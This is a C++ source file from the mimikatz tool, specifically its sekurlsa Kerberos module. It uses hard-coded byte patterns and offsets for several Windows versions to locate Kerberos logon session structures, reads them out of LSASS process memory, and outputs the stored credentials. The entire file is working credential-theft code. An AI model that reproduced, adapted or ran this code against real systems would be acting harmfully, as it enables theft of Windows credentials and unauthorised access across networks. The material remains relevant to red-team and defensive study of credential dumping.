/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by/3.0/fr/
	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "kerberos.h"
#include "..\..\global.h"
mod_process::PKIWI_VERY_BASIC_MODULEENTRY mod_mimikatz_sekurlsa_kerberos::pModKERBEROS = NULL;
mod_mimikatz_sekurlsa_kerberos::PKIWI_KERBEROS_LOGON_SESSION mod_mimikatz_sekurlsa_kerberos::KerbLogonSessionList = NULL; //reinterpret_cast<mod_mimikatz_sekurlsa_kerberos::PKIWI_KERBEROS_LOGON_SESSION>(NULL);
long mod_mimikatz_sekurlsa_kerberos::offsetMagic = 0;
PRTL_AVL_TABLE mod_mimikatz_sekurlsa_kerberos::KerbGlobalLogonSessionTable = NULL; //reinterpret_cast<PRTL_AVL_TABLE>(NULL);

bool mod_mimikatz_sekurlsa_kerberos::getKerberos(vector<wstring> * arguments)
{
	vector<pair<mod_mimikatz_sekurlsa::PFN_ENUM_BY_LUID, wstring>> monProvider;
	monProvider.push_back(make_pair<mod_mimikatz_sekurlsa::PFN_ENUM_BY_LUID, wstring>(getKerberosLogonData, wstring(L"kerberos")));
	return mod_mimikatz_sekurlsa::getLogonData(arguments, &monProvider);
}

bool mod_mimikatz_sekurlsa_kerberos::searchKerberosFuncs()
{
#ifdef _M_X64
	BYTE PTRN_WALL_KerbUnloadLogonSessionTable[]= {0x48, 0x8b, 0x18, 0x48, 0x8d, 0x0d};
	LONG OFFS_WALL_KerbUnloadLogonSessionTable	= sizeof(PTRN_WALL_KerbUnloadLogonSessionTable);

	BYTE PTRN_WALL_KerbFreeLogonSessionList[]	= {0x48, 0x3b, 0xfe, 0x0f, 0x84};
	LONG OFFS_WALL_KerbFreeLogonSessionList		= -4;
#elif defined _M_IX86
	BYTE PTRN_WNO8_KerbUnloadLogonSessionTable[]= {0x85, 0xc0, 0x74, 0x1f, 0x53};
	LONG OFFS_WNO8_KerbUnloadLogonSessionTable	= -(3 + 4);
	BYTE PTRN_WIN8_KerbUnloadLogonSessionTable[]= {0x85, 0xc0, 0x74, 0x2b, 0x57}; // 2c au lieu de 2b pour avant le RC
	LONG OFFS_WIN8_KerbUnloadLogonSessionTable	= -(6 + 4);

	BYTE PTRN_WALL_KerbFreeLogonSessionList[]	= {0xeb, 0x0f, 0x6a, 0x01, 0x57, 0x56, 0xe8};
	LONG OFFS_WALL_KerbFreeLogonSessionList		= -4;
#endif
	if(mod_mimikatz_sekurlsa::searchLSASSDatas() && pModKERBEROS && !(KerbGlobalLogonSessionTable || KerbLogonSessionList))
	{
		PBYTE *pointeur = NULL; PBYTE pattern = NULL; ULONG taille = 0; LONG offset = 0;

		if(mod_system::GLOB_Version.dwMajorVersion < 6)
		{
			pointeur= reinterpret_cast<PBYTE *>(&KerbLogonSessionList);
			pattern	= PTRN_WALL_KerbFreeLogonSessionList;
			taille	= sizeof(PTRN_WALL_KerbFreeLogonSessionList);
			offset	= OFFS_WALL_KerbFreeLogonSessionList;

			if(mod_system::GLOB_Version.dwMinorVersion < 2)
				offsetMagic = 8;
		}
		else
		{
			pointeur= reinterpret_cast<PBYTE *>(&KerbGlobalLogonSessionTable);

#ifdef _M_X64
			pattern	= PTRN_WALL_KerbUnloadLogonSessionTable;
			taille	= sizeof(PTRN_WALL_KerbUnloadLogonSessionTable);
			offset	= OFFS_WALL_KerbUnloadLogonSessionTable;
#elif defined _M_IX86
			if(mod_system::GLOB_Version.dwBuildNumber < 8000)
			{
				pattern	= PTRN_WNO8_KerbUnloadLogonSessionTable;
				taille	= sizeof(PTRN_WNO8_KerbUnloadLogonSessionTable);
				offset	= OFFS_WNO8_KerbUnloadLogonSessionTable;
			}
			else
			{
				if(mod_system::GLOB_Version.dwBuildNumber < 8400) // petite correction pour avant la RC
					PTRN_WIN8_KerbUnloadLogonSessionTable[3] = 0x2c;
				pattern	= PTRN_WIN8_KerbUnloadLogonSessionTable;
				taille	= sizeof(PTRN_WIN8_KerbUnloadLogonSessionTable);
				offset	= OFFS_WIN8_KerbUnloadLogonSessionTable;
			}
#endif
		}

		if(HMODULE monModule = LoadLibrary(L"kerberos"))
		{
			MODULEINFO mesInfos;
			if(GetModuleInformation(GetCurrentProcess(), monModule, &mesInfos, sizeof(MODULEINFO)))
			{
				mod_memory::genericPatternSearch(pointeur, L"kerberos", pattern, taille, offset);
				*pointeur += pModKERBEROS->modBaseAddr - reinterpret_cast<PBYTE>(mesInfos.lpBaseOfDll);
			}
			FreeLibrary(monModule);
		}
	}
	return (pModKERBEROS && (KerbGlobalLogonSessionTable || KerbLogonSessionList));
}

bool WINAPI mod_mimikatz_sekurlsa_kerberos::getKerberosLogonData(__in PLUID logId, __in bool justSecurity)
{
	if(searchKerberosFuncs())
	{
		PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds = NULL;
		DWORD taille;
		BYTE * monBuff = NULL;
		
		if(KerbGlobalLogonSessionTable)
		{
			taille = sizeof(KIWI_KERBEROS_PRIMARY_CREDENTIAL);
			monBuff = new BYTE[taille];
			
			if(PKIWI_KERBEROS_PRIMARY_CREDENTIAL pLogSession = reinterpret_cast<PKIWI_KERBEROS_PRIMARY_CREDENTIAL>(mod_mimikatz_sekurlsa::getPtrFromAVLByLuid(KerbGlobalLogonSessionTable, FIELD_OFFSET(KIWI_KERBEROS_PRIMARY_CREDENTIAL, LocallyUniqueIdentifier), logId)))
			{
				if(mod_memory::readMemory(pLogSession, monBuff, taille, mod_mimikatz_sekurlsa::hLSASS))
				{
					pLogSession = reinterpret_cast<PKIWI_KERBEROS_PRIMARY_CREDENTIAL>(monBuff);
					mesCreds =  &pLogSession->credentials;
				}
			}
		}
		else
		{
			taille = sizeof(KIWI_KERBEROS_LOGON_SESSION) + offsetMagic;
			monBuff = new BYTE[taille];
			if(PKIWI_KERBEROS_LOGON_SESSION pLogSession = reinterpret_cast<PKIWI_KERBEROS_LOGON_SESSION>(mod_mimikatz_sekurlsa::getPtrFromLinkedListByLuid(reinterpret_cast<PLIST_ENTRY>(KerbLogonSessionList), FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, LocallyUniqueIdentifier) + offsetMagic, logId)))
			{
				if(mod_memory::readMemory(pLogSession, monBuff, taille, mod_mimikatz_sekurlsa::hLSASS))
				{
					pLogSession = reinterpret_cast<PKIWI_KERBEROS_LOGON_SESSION>(monBuff);
					if(offsetMagic != 0)
						pLogSession = reinterpret_cast<PKIWI_KERBEROS_LOGON_SESSION>(reinterpret_cast<PBYTE>(pLogSession) + offsetMagic);
					mesCreds =  &pLogSession->credentials;
				}
			}
		}
		mod_mimikatz_sekurlsa::genericCredsToStream(mesCreds, justSecurity);
		delete [] monBuff;
	}
	else (*outputStream) << L"n.a. (kerberos KO)";

	return true;
}
